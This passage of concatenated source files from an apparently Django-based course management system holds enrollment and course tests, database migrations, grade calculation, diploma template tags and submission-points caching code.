        self.assertEqual(len(warnings), 0)
        instance.enroll_student(self.user)
        self.assertEqual(instance.students.count(), 2)
        self.assertTrue(instance.is_student(self.user))
        self.client.logout()

    def test_enrollment_exercise_external_users(self):
        # only external users may enroll
        instance = self.enrolled_course_instance
        instance.enrollment_audience = CourseInstance.ENROLLMENT_AUDIENCE.EXTERNAL_USERS
        instance.save()

        enroll_exercise = self.learning_objects[instance.id][2]
        enroll_exercise.status = LearningObject.STATUS.ENROLLMENT_EXTERNAL
        enroll_exercise.save()
        enroll_url = instance.get_url('enroll')
        exercise_url = reverse('exercise', kwargs={
            'exercise_path': enroll_exercise.url,
            'module_slug': enroll_exercise.course_module.url,
            'instance_slug': enroll_exercise.course_module.course_instance.url,
            'course_slug': enroll_exercise.course_module.course_instance.course.url,
        })

        # internal user may not enroll
        self.assertTrue(self.client.login(username=self.user.username, password=""testUser""))
        response = self.client.post(enroll_url)
        self.assertEqual(response.status_code, 403)
        response = self.client.get(exercise_url)
        self.assertEqual(response.status_code, 403)
        response = self.client.post(exercise_url)
        self.assertEqual(response.status_code, 403)
        self.assertFalse(instance.is_student(self.user))
        self.client.logout()

    def tearDown(self):
        # return previous logging settings
        logging.disable(logging.NOTSET)
/n/n/ncourse/tests.py/n/nfrom datetime import timedelta

from django.contrib.auth.models import User
from django.urls import reverse
from django.test import TestCase
from django.test.client import Client
from django.utils import timezone

from course.models import Course, CourseInstance, CourseHook, CourseModule, \
    LearningObjectCategory, StudentGroup
from exercise.models import BaseExercise, Submission
from exercise.exercise_models import LearningObject


class CourseTest(TestCase):
    def setUp(self):
        self.client = Client()

        self.user = User(username=""testUser"")
        self.user.set_password(""testPassword"")
        self.user.save()

        self.grader = User(username=""grader"", is_staff=True)
        self.grader.set_password(""graderPassword"")
        self.grader.save()

        self.superuser = User(username=""staff"", is_staff=False, is_superuser=True)
        self.superuser.set_password(""staffPassword"")
        self.superuser.save()

        self.course = Course.objects.create(
            name=""test course"",
            code=""123456"",
            url=""Course-Url""
        )

        self.today = timezone.now()
        self.tomorrow = self.today + timedelta(days=1)
        self.two_days_from_now = self.tomorrow + timedelta(days=1)
        self.yesterday = self.today - timedelta(days=1)

        self.past_course_instance = CourseInstance.objects.create(
            instance_name=""Fall 2011 day 0"",
            starting_time=self.yesterday,
            ending_time=self.today,
            course=self.course,
            url=""T-00.1000_d0""
        )

        self.current_course_instance = CourseInstance.objects.create(
            instance_name=""Fall 2011 day 1"",
            starting_time=self.today,
            ending_time=self.tomorrow,
            course=self.course,
            url=""T-00.1000_d1""
        )

        self.future_course_instance = CourseInstance.objects.create(
            instance_name=""Fall 2011 day 2"",
            starting_time=self.tomorrow,
            ending_time=self.two_days_from_now,
            course=self.course,
            url=""T-00.1000_d2""
        )

        self.hidden_course_instance = CourseInstance.objects.create(
            instance_name=""Secret super course"",
            starting_time=self.tomorrow,
            ending_time=self.two_days_from_now,
            course=self.course,
            url=""T-00.1000_hidden"",
            visible_to_students=False
        )

        self.course_module = CourseModule.objects.create(
            name=""test module"",
            url=""test-module"",
            points_to_pass=10,
            course_instance=self.current_course_instance,
            opening_time=self.today,
            closing_time=self.tomorrow
        )

        self.course_module_with_late_submissions_allowed = CourseModule.objects.create(
            name=""test module"",
            url=""test-module-late"",
            points_to_pass=50,
            course_instance=self.current_course_instance,
            opening_time=self.today,
            closing_time=self.tomorrow,
            late_submissions_allowed=True,
            late_submission_deadline=self.two_days_from_now,
            late_submission_penalty=0.2
        )

        self.learning_object_category = LearningObjectCategory.objects.create(
            name=""test category"",
            course_instance=self.current_course_instance,
            points_to_pass=5
        )

        #self.hidden_learning_object_category = LearningObjectCategory.objects.create(
        #    name=""hidden category"",
        #    course_instance=self.current_course_instance
        #)
        #self.hidden_learning_object_category.hidden_to.add(self.user.userprofile)

        self.learning_object = LearningObject.objects.create(
            name=""test learning object"",
            course_module=self.course_module,
            category=self.learning_object_category,
            url='l1',
        )

        self.broken_learning_object = LearningObject.objects.create(
            name=""test learning object"",
            course_module=self.course_module_with_late_submissions_allowed,
            category=self.learning_object_category,
            url='l2',
        )

        self.base_exercise = BaseExercise.objects.create(
            name=""test exercise"",
            course_module=self.course_module,
            category=self.learning_object_category,
            service_url=""http://localhost/"",
            url='b1',
        )

        self.submission = Submission.objects.create(
            exercise=self.base_exercise,
            grader=self.grader.userprofile
        )
        self.submission.submitters.add(self.user.userprofile)

        self.course_hook = CourseHook.objects.create(
            hook_url=""test_hook_url"",
            course_instance=self.current_course_instance
        )

    def test_course_instance_open(self):
        self.assertFalse(self.past_course_instance.is_open())
        self.assertTrue(self.current_course_instance.is_open())
        self.assertFalse(self.future_course_instance.is_open())

    def test_course_url(self):
        self.assertEqual(""/Course-Url/T-00.1000_d1/"", self.current_course_instance.get_absolute_url())
        self.assertEqual(""/Course-Url/T-00.1000_hidden/"", self.hidden_course_instance.get_absolute_url())

    def test_course_staff(self):
        self.assertFalse(self.course.is_teacher(self.user))
        self.assertFalse(self.current_course_instance.is_assistant(self.user))
        self.assertFalse(self.current_course_instance.is_teacher(self.user))
        self.assertFalse(self.current_course_instance.is_course_staff(self.user))
        self.assertEquals(0, len(self.current_course_instance.get_course_staff_profiles()))

        self.current_course_instance.assistants.add(self.user.userprofile)

        self.assertFalse(self.course.is_teacher(self.user))
        self.assertTrue(self.current_course_instance.is_assistant(self.user))
        self.assertFalse(self.current_course_instance.is_teacher(self.user))
        self.assertTrue(self.current_course_instance.is_course_staff(self.user))
        self.assertEquals(1, len(self.current_course_instance.get_course_staff_profiles()))

        self.course.teachers.add(self.user.userprofile)

        self.assertTrue(self.course.is_teacher(self.user))
        self.assertTrue(self.current_course_instance.is_assistant(self.user))
        self.assertTrue(self.current_course_instance.is_teacher(self.user))
        self.assertTrue(self.current_course_instance.is_course_staff(self.user))
        self.assertEquals(1, len(self.current_course_instance.get_course_staff_profiles()))
        self.assertEquals(""testUser"", self.current_course_instance.get_course_staff_profiles()[0].shortname)

        self.current_course_instance.assistants.clear()

        self.assertTrue(self.course.is_teacher(self.user))
        self.assertFalse(self.current_course_instance.is_assistant(self.user))
        self.assertTrue(self.current_course_instance.is_teacher(self.user))
        self.assertTrue(self.current_course_instance.is_course_staff(self.user))
        self.assertEquals(1, len(self.current_course_instance.get_course_staff_profiles()))

        self.course.teachers.clear()

        self.assertFalse(self.course.is_teacher(self.user))
        self.assertFalse(self.current_course_instance.is_assistant(self.user))
        self.assertFalse(self.current_course_instance.is_teacher(self.user))
        self.assertFalse(self.current_course_instance.is_course_staff(self.user))
        self.assertEquals(0, len(self.current_course_instance.get_course_staff_profiles()))

    def test_course_instance_submitters(self):
        students = self.current_course_instance.get_submitted_profiles()
        self.assertEquals(1, len(students))
        self.assertEquals(""testUser"", students[0].shortname)

        submission2 = Submission.objects.create(
            exercise=self.base_exercise,
            grader=self.grader.userprofile)
        submission2.submitters.add(self.user.userprofile)

        students = self.current_course_instance.get_submitted_profiles()
        self.assertEquals(1, len(students))
        self.assertEquals(""testUser"", students[0].shortname)

        submission3 = Submission.objects.create(
            exercise=self.base_exercise,
            grader=self.user.userprofile)
        submission3.submitters.add(self.grader.userprofile)

        students = self.current_course_instance.get_submitted_profiles()
        self.assertEquals(2, len(students))
        self.assertEquals(""testUser"", students[0].shortname)
        self.assertEquals(""grader"", students[1].shortname)

    def test_course_instance_visibility(self):
        self.assertTrue(self.current_course_instance.is_visible_to())
        self.assertFalse(self.hidden_course_instance.is_visible_to())
        self.assertTrue(self.current_course_instance.is_visible_to(self.user))
        self.assertFalse(self.hidden_course_instance.is_visible_to(self.user))
        self.assertTrue(self.current_course_instance.is_visible_to(self.superuser))
        self.assertTrue(self.hidden_course_instance.is_visible_to(self.superuser))

    def test_course_instance_get_visible(self):
        open_course_instances = CourseInstance.objects.get_visible()
        self.assertEqual(3, len(open_course_instances))
        self.assertTrue(self.current_course_instance in open_course_instances)
        self.assertTrue(self.future_course_instance in open_course_instances)

        open_course_instances = CourseInstance.objects.get_visible(self.user)
        self.assertEqual(3, len(open_course_instances))
        self.assertTrue(self.current_course_instance in open_course_instances)
        self.assertTrue(self.future_course_instance in open_course_instances)

        open_course_instances = CourseInstance.objects.get_visible(self.superuser)
        self.assertEqual(4, len(open_course_instances))
        self.assertTrue(self.current_course_instance in open_course_instances)
        self.assertTrue(self.future_course_instance in open_course_instances)
        self.assertTrue(self.hidden_course_instance in open_course_instances)

    def test_course_instance_unicode_string(self):
        self.assertEquals(""123456 test course: Fall 2011 day 1"", str(self.current_course_instance))
        self.assertEquals(""123456 test course: Secret super course"", str(self.hidden_course_instance))

    def test_course_hook_unicode_string(self):
        self.assertEquals(""123456 test course: Fall 2011 day 1 -> test_hook_url"", str(self.course_hook))

    def test_course_module_late_submission_point_worth(self):
        self.assertEquals(0, self.course_module.get_late_submission_point_worth())
        self.assertEquals(80, self.course_module_with_late_submissions_allowed.get_late_submission_point_worth())

    def test_course_module_open(self):
        self.assertFalse(self.course_module.is_open(self.yesterday))
        self.assertTrue(self.course_module.is_open(self.today))
        self.assertTrue(self.course_module.is_open())
        self.assertTrue(self.course_module.is_open(self.tomorrow))
        self.assertFalse(self.course_module.is_open(self.two_days_from_now))

    def test_course_module_after_open(self):
        self.assertFalse(self.course_module.is_after_open(self.yesterday))
        self.assertTrue(self.course_module.is_after_open(self.today))
        self.assertTrue(self.course_module.is_after_open())
        self.assertTrue(self.course_module.is_after_open(self.tomorrow))
        self.assertTrue(self.course_module.is_after_open(self.two_days_from_now))

    def test_course_views(self):
        response = self.client.get('/no_course/test', follow=True)
        self.assertEqual(response.status_code, 404)
        response = self.client.get(self.current_course_instance.get_absolute_url(), follow=True)
        self.assertTrue(response.redirect_chain)
        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed(response, 'userprofile/login.html')

        self.client.login(username=""testUser"", password=""testPassword"")
        response = self.client.get('/no_course/test', follow=True)
        self.assertEqual(response.status_code, 404)
        response = self.client.get(self.current_course_instance.get_absolute_url(), follow=True)
        self.assertEqual(response.status_code, 200)

        self.assertEqual(response.context[""course""], self.course)
        self.assertEqual(response.context[""instance""], self.current_course_instance)
        self.assertFalse(response.context[""is_assistant""])
        self.assertFalse(response.context[""is_teacher""])

        response = self.client.get(self.hidden_course_instance.get_absolute_url(), follow=True)
        self.assertEqual(response.status_code, 403)

    def test_course_teacher_views(self):
        url = self.current_course_instance.get_edit_url()
        response = self.client.get(url)
        self.assertEqual(response.status_code, 302)

        self.client.login(username=""testUser"", password=""testPassword"")
        response = self.client.get(url)
        self.assertEqual(response.status_code, 403)

        self.current_course_instance.assistants.add(self.grader.userprofile)
        self.client.login(username=""grader"", password=""graderPassword"")
        response = self.client.get(url)
        self.assertEqual(response.status_code, 403)
        response = self.client.get(self.current_course_instance.get_absolute_url(), follow=True)
        self.assertEqual(response.status_code, 200)
        self.assertTrue(response.context[""is_assistant""])
        self.assertFalse(response.context[""is_teacher""])

        self.current_course_instance.assistants.clear()
        self.course.teachers.add(self.grader.userprofile)
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        response = self.client.get(self.current_course_instance.get_absolute_url(), follow=True)
        self.assertEqual(response.status_code, 200)
        self.assertFalse(response.context[""is_assistant""])
        self.assertTrue(response.context[""is_teacher""])

        self.client.logout()
        response = self.client.get(url)
        self.assertEqual(response.status_code, 302)

        self.client.login(username=""staff"", password=""staffPassword"")
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.assertFalse(response.context[""is_assistant""])
        self.assertTrue(response.context[""is_teacher""])

    def test_groups(self):
        group = StudentGroup(course_instance=self.current_course_instance)
        group.save()
        group.members.add(self.user.userprofile,self.grader.userprofile)
        self.assertEqual(StudentGroup.get_exact(self.current_course_instance,
            [self.user.userprofile,self.grader.userprofile]), group)
        self.assertEqual(StudentGroup.get_exact(self.current_course_instance,
            [self.user.userprofile,self.superuser.userprofile]), None)
/n/n/ndeviations/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('exercise', '0006_auto_20150625_1823'),
        ('userprofile', '0002_auto_20150427_1717'),
    ]

    state_operations = [
        migrations.CreateModel(
            name='DeadlineRuleDeviation',
            fields=[
                ('id', models.AutoField(primary_key=True, serialize=False, auto_created=True, verbose_name='ID')),
                ('extra_minutes', models.IntegerField()),
                ('exercise', models.ForeignKey(to='exercise.BaseExercise', on_delete=models.CASCADE)),
                ('submitter', models.ForeignKey(to='userprofile.UserProfile', on_delete=models.CASCADE)),
            ],
            options={
                'abstract': False,
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='MaxSubmissionsRuleDeviation',
            fields=[
                ('id', models.AutoField(primary_key=True, serialize=False, auto_created=True, verbose_name='ID')),
                ('extra_submissions', models.IntegerField()),
                ('exercise', models.ForeignKey(to='exercise.BaseExercise', on_delete=models.CASCADE)),
                ('submitter', models.ForeignKey(to='userprofile.UserProfile', on_delete=models.CASCADE)),
            ],
            options={
                'abstract': False,
            },
            bases=(models.Model,),
        ),
        migrations.AlterUniqueTogether(
            name='maxsubmissionsruledeviation',
            unique_together=set([('exercise', 'submitter')]),
        ),
        migrations.AlterUniqueTogether(
            name='deadlineruledeviation',
            unique_together=set([('exercise', 'submitter')]),
        ),
    ]

    operations = [
        migrations.SeparateDatabaseAndState(state_operations=state_operations)
    ]
/n/n/ndeviations/models.py/n/nfrom datetime import timedelta

from django.urls import reverse
from django.db import models

from exercise.exercise_models import BaseExercise
from userprofile.models import UserProfile
from lib.models import UrlMixin


class SubmissionRuleDeviation(UrlMixin, models.Model):
    """"""
    An abstract model binding a user to an exercise stating that there is some
    kind of deviation from the normal submission boundaries, that is, special
    treatment related to the submissions of that particular user to that
    particular exercise.

    If there are many submitters submitting an exercise out of bounds of the
    default bounds, all of the submitters must have an allowing instance of
    SubmissionRuleDeviation subclass in order for the submission to be allowed.
    """"""
    exercise = models.ForeignKey(BaseExercise, on_delete=models.CASCADE)
    submitter = models.ForeignKey(UserProfile, on_delete=models.CASCADE)

    class Meta:
        abstract = True
        unique_together = [""exercise"", ""submitter""]

    def get_url_kwargs(self):
        return dict(deviation_id=self.id, **self.exercise.course_instance.get_url_kwargs())


class DeadlineRuleDeviation(SubmissionRuleDeviation):
    extra_minutes = models.IntegerField()
    without_late_penalty = models.BooleanField(default=True)

    class Meta(SubmissionRuleDeviation.Meta):
        pass

    def get_extra_time(self):
        return timedelta(minutes=self.extra_minutes)

    def get_new_deadline(self):
        return self.get_normal_deadline() + self.get_extra_time()

    def get_normal_deadline(self):
        return self.exercise.course_module.closing_time


class MaxSubmissionsRuleDeviation(SubmissionRuleDeviation):
    extra_submissions = models.IntegerField()

    class Meta(SubmissionRuleDeviation.Meta):
        pass
/n/n/ndiploma/grade.py/n/nfrom copy import copy


def calculate_grade(total_points, point_limits, pad_points):
    points = total_points['points']
    d_points = copy(total_points['points_by_difficulty'])

    def pass_limit(bound):
        if isinstance(bound, list):
            ds,ls = zip(*bound)
            for i,d in enumerate(ds):

                if pad_points:
                    p = d_points.get(d, 0)
                    l = ls[i]
                    if p < l:
                        for j in range(i + 1, len(ds)):
                            jd = ds[j]
                            jp = d_points.get(jd, 0)
                            if jp > l - p:
                                d_points[jd] -= l - p
                                d_points[d] = l
                                break
                            else:
                                p += jp
                                d_points[d] = p
                                d_points[jd] = 0
                    else:
                        continue

                if d_points.get(d, 0) < ls[i]:
                    return False

            return True
        else:
            return points >= bound

    grade = 0
    for bound in point_limits:
        if pass_limit(bound):
            grade += 1
        else:
            break
    return grade


def assign_grade(cached_points, diploma_design):

    if not (diploma_design and cached_points.user.is_authenticated):
        return -1

    if not diploma_design.course.is_course_staff(cached_points.user):
        avail = diploma_design.availability
        opt = diploma_design.USERGROUP
        external = cached_points.user.userprofile.is_external
        if (
            (avail == opt.EXTERNAL_USERS and not external)
            or (avail == opt.INTERNAL_USERS and external)
        ):
            return -1

    def is_passed(model):
        entry,_,_,_ = cached_points.find(model)
        return entry['passed']
    if not all(is_passed(m) for m in diploma_design.modules_to_pass.all()):
        return 0
    if not all(is_passed(e) for e in diploma_design.exercises_to_pass.all()):
        return 0

    return calculate_grade(
        cached_points.total(),
        diploma_design.point_limits,
        diploma_design.pad_points
    )
/n/n/ndiploma/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations
import django.db.models.deletion
import diploma.models
import lib.models
import lib.fields


class Migration(migrations.Migration):

    dependencies = [
        ('exercise', '0024_auto_20160919_1951'),
        ('course', '0030_auto_20160912_1341'),
        ('userprofile', '0003_auto_20160728_1139'),
    ]

    operations = [
        migrations.CreateModel(
            name='CourseDiplomaDesign',
            fields=[
                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),
                ('logo', models.ImageField(null=True, blank=True, upload_to=diploma.models.build_upload_dir)),
                ('title', models.TextField(blank=True)),
                ('body', models.TextField(blank=True)),
                ('date', models.CharField(max_length=256)),
                ('signature_name', models.CharField(blank=True, max_length=256)),
                ('signature_title', models.CharField(blank=True, max_length=256)),
                ('small_print', models.TextField(blank=True)),
                ('point_limits', lib.fields.JSONField(blank=True, help_text='A list of length 5 where each element is the required points for n:th grade.The element can be a list of 2-tuples [[difficulty_level_a, points],[difficulty_level_b, points]].')),
                ('pad_points', models.BooleanField(help_text='If difficulty levels are used the lower level can be padded with higher level points.', default=False)),
                ('course', models.OneToOneField(on_delete=django.db.models.deletion.SET_NULL, to='course.CourseInstance', null=True)),
                ('exercises_to_pass', models.ManyToManyField(blank=True, to='exercise.BaseExercise')),
                ('modules_to_pass', models.ManyToManyField(blank=True, to='course.CourseModule')),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='StudentDiploma',
            fields=[
                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),
                ('created', models.DateTimeField(auto_now=True)),
                ('hashkey', models.CharField(unique=True, max_length=32)),
                ('name', models.CharField(max_length=255)),
                ('grade', models.PositiveIntegerField(default=0)),
                ('design', models.ForeignKey(to='diploma.CourseDiplomaDesign', on_delete=models.CASCADE)),
                ('profile', models.ForeignKey(on_delete=django.db.models.deletion.SET_NULL, to='userprofile.UserProfile', null=True)),
            ],
            options={
            },
            bases=(lib.models.UrlMixin, models.Model),
        ),
    ]
/n/n/ndiploma/templatetags/diploma.py/n/nfrom django import template
from django.urls import reverse

from exercise.templatetags.exercise import _prepare_context
from ..grade import assign_grade
from ..models import CourseDiplomaDesign


register = template.Library()


@register.inclusion_tag(""diploma/_diploma_button.html"", takes_context=True)
def diploma_button(context, student=None):
    points = _prepare_context(context, student)
    design = CourseDiplomaDesign.objects.filter(course=points.instance).first()
    url = None
    if design and points.user.is_authenticated:
        url = reverse('diploma-create', kwargs={
            'coursediploma_id': design.id,
            'userprofile_id': points.user.userprofile.id,
        })
    return {
        'grade': assign_grade(points, design),
        'url': url,
        'is_course_staff': context.get('is_course_staff'),
    }
/n/n/nedit_course/templatetags/editcourse.py/n/nfrom django import template
from django.urls import reverse

from course.models import CourseInstance


register = template.Library()


def _normal_kwargs(instance, model_name, **extra_kwargs):
    kwargs = instance.get_url_kwargs()
    kwargs.update({
        ""model"": model_name,
    })
    kwargs.update(extra_kwargs)
    return kwargs


@register.filter
def editurl(model_object, model_name):
    return reverse('model-edit', kwargs=_normal_kwargs(
        model_object.course_instance,
        model_name,
        id=model_object.id,
    ))


@register.filter
def removeurl(model_object, model_name):
    return reverse('model-remove', kwargs=_normal_kwargs(
        model_object.course_instance,
        model_name,
        id=model_object.id,
    ))


@register.filter
def createurl(model_object, model_name):
    type_name = None
    if "","" in model_name:
        model_name, type_name = model_name.split("","", 1)
    if isinstance(model_object, CourseInstance):
        return reverse('model-create', kwargs=_normal_kwargs(
            model_object,
            model_name,
        ))
    if type_name:
        return reverse('model-create-type-for', kwargs=_normal_kwargs(
            model_object.course_instance,
            model_name,
            parent_id=model_object.id,
            type=type_name,
        ))
    return reverse('model-create-for', kwargs=_normal_kwargs(
        model_object.course_instance,
        model_name,
        parent_id=model_object.id,
    ))
/n/n/nexercise/cache/points.py/n/nfrom copy import deepcopy
from django.db.models.signals import post_save, post_delete, m2m_changed
from django.utils import timezone

from lib.cache import CachedAbstract
from notification.models import Notification
from ..models import LearningObject, Submission
from .hierarchy import ContentMixin


class CachedPoints(ContentMixin, CachedAbstract):
    KEY_PREFIX = 'points'

    def __init__(self, course_instance, user, content):
        self.content = content
        self.instance = course_instance
        self.user = user
        super().__init__(course_instance, user)

    def _needs_generation(self, data):
        return data is None or data['created'] < self.content.created()

    def _generate_data(self, instance, user, data=None):
        data = deepcopy(self.content.data)
        module_index = data['module_index']
        exercise_index = data['exercise_index']
        modules = data['modules']
        categories = data['categories']
        total = data['total']

        # Augment submission parameters.
        def r_augment(children):
            for entry in children:
                if entry['submittable']:
                    entry.update({
                        'submission_count': 0,
                        'submissions': [],
                        'best_submission': None,
                        'points': 0,
                        'passed': entry['points_to_pass'] == 0,
                        'graded': False,
                        'unofficial': False,
                    })
                r_augment(entry.get('children'))
        for module in modules:
            module.update({
                'submission_count': 0,
                'points': 0,
                'points_by_difficulty': {},
                'unconfirmed_points_by_difficulty': {},
                'passed': module['points_to_pass'] == 0,
            })
            r_augment(module['children'])
        for entry in categories.values():
            entry.update({
                'submission_count': 0,
                'points': 0,
                'points_by_difficulty': {},
                'unconfirmed_points_by_difficulty': {},
                'passed': entry['points_to_pass'] == 0,
            })
        total.update({
            'submission_count': 0,
            'points': 0,
            'points_by_difficulty': {},
            'unconfirmed_points_by_difficulty': {},
        })

        # Augment submission data.
        if user.is_authenticated:
            submissions = (
                user.userprofile.submissions.exclude_errors()
                .filter(exercise__course_module__course_instance=instance)
                .prefetch_related('exercise')
                .only('id', 'exercise', 'submission_time', 'status', 'grade')
            )
            for submission in submissions:
                try:
                    tree = self._by_idx(modules, exercise_index[submission.exercise.id])
                except KeyError:
                    self.dirty = True
                    continue
                entry = tree[-1]
                entry['submission_count'] += 1 if not submission.status in (Submission.STATUS.ERROR, Submission.STATUS.UNOFFICIAL) else 0
                unofficial = submission.status == Submission.STATUS.UNOFFICIAL
                entry['submissions'].append({
                    'id': submission.id,
                    'max_points': entry['max_points'],
                    'points_to_pass': entry['points_to_pass'],
                    'confirm_the_level': entry.get('confirm_the_level', False),
                    'submission_count': 1, # to fool points badge
                    'points': submission.grade,
                    'graded': submission.is_graded,
                    'passed': submission.grade >= entry['points_to_pass'],
                    'submission_status': submission.status if not submission.is_graded else False,
                    'unofficial': unofficial,
                    'date': submission.submission_time,
                    'url': submission.get_url('submission-plain'),
                })
                if (
                    submission.status == Submission.STATUS.READY and (
                        entry['unofficial']
                        or submission.grade >= entry['points']
                    )
                ) or (
                    unofficial and (
                        not entry['graded']
                        or (entry['unofficial'] and submission.grade > entry['points'])
                    )
                ):
                    entry.update({
                        'best_submission': submission.id,
                        'points': submission.grade,
                        'passed': not unofficial and submission.grade >= entry['points_to_pass'],
                        'graded': submission.status == Submission.STATUS.READY,
                        'unofficial': unofficial,
                    })
                if submission.notifications.count() > 0:
                    entry['notified'] = True
                    if submission.notifications.filter(seen=False).count() > 0:
                        entry['unseen'] = True

        # Confirm points.
        def r_check(parent, children):
            for entry in children:
                if (
                    entry['submittable']
                    and entry['confirm_the_level']
                    and entry['passed']
                ):
                    if 'unconfirmed' in parent:
                        del(parent['unconfirmed'])
                    for child in parent.get('children', []):
                        if 'unconfirmed' in child:
                            del(child['unconfirmed'])
                r_check(entry, entry.get('children', []))
        for module in modules:
            r_check(module, module['children'])

        # Collect points and check limits.
        def add_to(target, entry):
            target['submission_count'] += entry['submission_count']
            if entry.get('unofficial', False):
                pass
            elif entry.get('unconfirmed', False):
                self._add_by_difficulty(
                    target['unconfirmed_points_by_difficulty'],
                    entry['difficulty'],
                    entry['points']
                )
            else:
                target['points'] += entry['points']
                self._add_by_difficulty(
                    target['points_by_difficulty'],
                    entry['difficulty'],
                    entry['points']
                )
        def r_collect(module, parent, children):
            passed = True
            max_points = 0
            submissions = 0
            points = 0
            confirm_entry = None
            for entry in children:
                if entry['submittable']:
                    if entry['confirm_the_level']:
                        confirm_entry = entry
                    else:
                        passed = passed and entry['passed']
                        max_points += entry['max_points']
                        submissions += entry['submission_count']
                        if entry['graded']:
                            points += entry['points']
                            add_to(module, entry)
                            add_to(categories[entry['category_id']], entry)
                            add_to(total, entry)
                passed = (
                    r_collect(module, entry, entry.get('children', []))
                    and passed
                )
            if confirm_entry and submissions > 0:
                confirm_entry['confirmable_points'] = True
            if parent and not parent['submittable']:
                parent['max_points'] = max_points
                parent['submission_count'] = submissions
                parent['points'] = points
            return passed
        for module in modules:
            passed = r_collect(module, None, module['children'])
            module['passed'] = (
                passed
                and module['points'] >= module['points_to_pass']
            )
        for category in categories.values():
            category['passed'] = (
                category['points'] >= category['points_to_pass']
            )

        data['points_created'] = timezone.now()
        return data

    def created(self):
        return self.data['points_created'], super().created()

    def submission_ids(self, number=None, category_id=None, module_id=None,
                       exercise_id=None, filter_for_assistant=False, best=True):
        exercises = self.search_exercises(
            number=number,
            category_id=category_id,
            module_id=module_id,
            exercise_id=exercise_id,
            filter_for_assistant=filter_for_assistant,
        )
        submissions = []
        if best:
            for entry in exercises:
                sid = entry.get('best_submission', None)
                if not sid is None:
                    submissions.append(sid)
        else:
            for entry in exercises:
                submissions.extend(s['id'] for s in entry.get('submissions', []))
        return submissions


def invalidate_content(sender, instance, **kwargs):
    course = instance.exercise.course_instance
    for profile in instance.submitters.all():
        CachedPoints.invalidate(course, profile.user)

def invalidate_content_m2m(sender, instance, action, reverse, model, pk_set, **kwargs):
    # many-to-many field Submission.submitters may be modified without
    # triggering the Submission post save hook
    if action not in ('post_add', 'pre_remove'):
        return
    if reverse:
        # instance is a UserProfile
        if model == Submission:
            seen_courses = set()
            for submission_pk in pk_set:
                try:
                    submission = Submission.objects.get(pk=submission_pk)
                    course_instance = submission.exercise.course_instance
                    if course_instance.pk not in seen_courses:
                        CachedPoints.invalidate(course_instance, instance.user)
                    else:
                        seen_courses.add(course_instance.pk)
                except Submission.DoesNotExist:
                    pass
    else:
        # instance is a Submission
        invalidate_content(Submission, instance)

def invalidate_notification(sender, instance, **kwargs):
    course = instance.course_instance
    if not course and instance.submission:
        course = instance.submission.exercise.course_instance
    CachedPoints.invalidate(course, instance.recipient.user)


# Automatically invalidate cached points when submissions change.
post_save.connect(invalidate_content, sender=Submission)
post_delete.connect(invalidate_content, sender=Submission)
post_save.connect(invalidate_notification, sender=Notification)
post_delete.connect(invalidate_notification, sender=Notification)
# listen to the m2m_changed signal since submission.submitters is a many-to-many
# field and instances must be saved before the many-to-many fields may be modified,
# that is to say, the submission post save hook may see an empty submitters list
m2m_changed.connect(invalidate_content_m2m, sender=Submission.submitters.through)
/n/n/nexercise/exercise_models.py/n/nimport datetime
from urllib.parse import urlsplit
from django.conf import settings
from django.contrib import messages
from django.core.exceptions import ValidationError, PermissionDenied
from django.core.files.storage import default_storage
from django.urls import reverse
from django.db import models
from django.db.models import signals
from django.db.models.signals import post_delete, post_save
from django.template import loader, Context
from django.utils import timezone
from django.utils.formats import date_format
from django.utils.translation import get_language, ugettext_lazy as _

from aplus.api import api_reverse
from course.models import StudentGroup, CourseInstance, CourseModule, LearningObjectCategory
from external_services.lti import CustomStudentInfoLTIRequest
from external_services.models import LTIService
from inheritance.models import ModelWithInheritance
from lib.api.authentication import (
    get_graderauth_submission_params,
    get_graderauth_exercise_params,
)
from lib.fields import JSONField
from lib.helpers import (
    Enum,
    update_url_params,
    safe_file_name,
    roman_numeral,
)
from lib.models import UrlMixin
from lib.localization_syntax import pick_localized
from lib.validators import generate_url_key_validator
from userprofile.models import UserProfile

from .cache.exercise import ExerciseCache
from .protocol.aplus import load_exercise_page, load_feedback_page
from .protocol.exercise_page import ExercisePage


class LearningObjectManager(models.Manager):

    def get_queryset(self):
        return super().get_queryset()\
            .defer('description')\
            .select_related('course_module', 'course_module__course_instance',
                'course_module__course_instance__course', 'category')

    def find_enrollment_exercise(self, course_instance, profile):
        exercise = None
        if profile.is_external:
            exercise = self.filter(
                course_module__course_instance=course_instance,
                status='enrollment_ext'
            ).first()
        return exercise or self.filter(
            course_module__course_instance=course_instance,
            status='enrollment'
        ).first()


class LearningObject(UrlMixin, ModelWithInheritance):
    """"""
    All learning objects inherit this model.
    """"""
    STATUS = Enum([
        ('READY', 'ready', _(""Ready"")),
        ('UNLISTED', 'unlisted', _(""Unlisted in table of contents"")),
        ('ENROLLMENT', 'enrollment', _(""Enrollment questions"")),
        ('ENROLLMENT_EXTERNAL', 'enrollment_ext', _(""Enrollment questions for external students"")),
        ('HIDDEN', 'hidden', _(""Hidden from non course staff"")),
        ('MAINTENANCE', 'maintenance', _(""Maintenance"")),
    ])
    AUDIENCE = Enum([
        ('COURSE_AUDIENCE', 0, _('Course audience')),
        ('INTERNAL_USERS', 1, _('Only internal users')),
        ('EXTERNAL_USERS', 2, _('Only external users')),
        ('REGISTERED_USERS', 3, _('Only registered users')),
    ])
    status = models.CharField(max_length=32,
        choices=STATUS.choices, default=STATUS.READY)
    audience = models.IntegerField(choices=AUDIENCE.choices,
        default=AUDIENCE.COURSE_AUDIENCE)
    category = models.ForeignKey(LearningObjectCategory, on_delete=models.CASCADE,
            related_name=""learning_objects"")
    course_module = models.ForeignKey(CourseModule, on_delete=models.CASCADE,
            related_name=""learning_objects"")
    parent = models.ForeignKey('self', on_delete=models.SET_NULL,
        blank=True, null=True, related_name='children')
    order = models.IntegerField(default=1)
    url = models.CharField(max_length=255,
        validators=[generate_url_key_validator()],
        help_text=_(""Input an URL identifier for this object.""))
    name = models.CharField(max_length=255)
